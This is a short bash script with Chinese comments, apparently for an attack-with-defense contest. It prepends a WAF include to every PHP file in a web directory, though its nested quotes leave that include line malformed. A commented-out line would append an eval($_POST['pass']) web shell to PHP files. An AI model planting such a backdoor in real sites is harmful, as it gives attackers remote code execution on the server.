#!/bin/bash
tar -zcvf wwwback.tar.gz ./

mv waf.php waf.phpbk

#在每个.php文件第一行写入包含waf
phpfile=$(find -name '*.php')
for pf in $phpfile
	do
		sed -i '1 i\<?php include('waf.php') ?>' $pf #应该写waf的绝对路径
	done
#在每一个php文件最后插马
#sed -i '$ a\<?php eval($_POST['pass']);?>' xxx.php
#还原waf，以其他php正确包含waf
mv waf.phpbk waf.php

